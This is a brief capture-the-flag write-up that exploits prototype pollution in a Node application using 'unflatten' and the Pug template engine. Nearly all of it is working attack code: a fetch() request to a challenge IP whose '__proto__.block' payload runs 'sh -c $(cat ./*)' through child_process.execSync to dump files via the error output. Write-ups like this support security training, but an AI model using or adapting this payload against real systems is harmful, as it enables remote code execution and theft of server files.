So due to how the pug engine works and the fact that your input is run through unflatten you can do prototype polution

We run this as it will cat out all files and then error as its trying to run that as a command therefor allowing us to read the output in the error
```bash
sh -c '$(cat ./*)'
```

```js
fetch("http://46.101.54.143:31088/api/submit", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache"
  },
  "referrer": "http://46.101.54.143:31088/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({
    "song.name": "ASTa la vista baby",
    "__proto__.block": {"type":"Text","line":"process.mainModule.require('child_process').execSync(`sh -c '$(cat ./*)'`)"}
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```